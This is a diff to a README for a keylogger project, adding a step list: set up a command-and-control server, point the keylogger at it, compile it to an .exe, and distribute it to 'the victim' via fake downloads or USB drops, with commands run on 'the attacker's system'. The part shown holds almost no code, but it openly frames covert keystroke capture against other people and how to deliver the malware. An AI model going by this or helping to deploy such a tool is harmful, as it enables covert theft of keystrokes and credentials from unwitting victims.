@@ -36,6 +36,15 @@ This project demonstrates a realistic keylogger that:
 - **Persistent local logs** on the server:
   - `keyboard_capture.txt` — all raw keystrokes received
   - `flagged_capture.txt` — only events that matched a detection rule
+
+## In this project, you will:
+
+1. Set up the C2 server (VPS).
+2. Configure the keylogger with your server IP.
+3. Compile the keylogger into a `.exe` file.
+4. Distribute the `.exe` to the victim (e.g., via fake download, USB drop, etc.).
+
+All commands below are run on **your own machine** (the attacker’s system), unless stated otherwise.
 ---
 
 ## 1. Server Setup (Command & Control)
@@ -65,7 +74,7 @@ cd express-server-basic
 node server.js
 ```
 
-## 2. Keylogger Configuration (The Victim Machine)
+## 2. Keylogger Configuration 
 
 On the machine where you will run the keylogger (the victim machine), clone this repository:
 
